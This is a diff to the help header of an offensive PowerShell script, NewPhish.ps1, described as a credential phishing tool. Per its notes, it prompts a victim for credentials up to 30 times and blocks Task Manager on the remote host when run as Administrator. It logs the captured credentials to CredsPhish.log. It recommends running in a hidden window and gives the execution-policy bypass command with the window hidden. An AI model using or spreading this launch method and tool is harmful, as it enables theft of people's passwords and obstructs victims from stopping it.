@@ -14,8 +14,16 @@ Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
    This Script will limmit the number of times that asks for credentials to less than 30 attempts before aborting.
    This script will Block remote-host Task Manager during current tasks IF executed with Administrator privileges. 
 
+.NOTES
+   Its recomended to exec NewPhish.ps1 in a hidden terminal windows.
+   This Script will limmit the number of times that asks for credentials to less than 30 attempts before aborting.
+   This script will Block remote-host Task Manager during current tasks IF executed with Administrator privileges.
+
 .EXAMPLE
-   powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
+   PS C:\> powershell -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
+
+.INPUTS
+   None. You cannot pipe objects to NewPhish.ps1
 
 .OUTPUTS
    Saves CredsPhish.log to the selected directory. 'tmp' is the default.
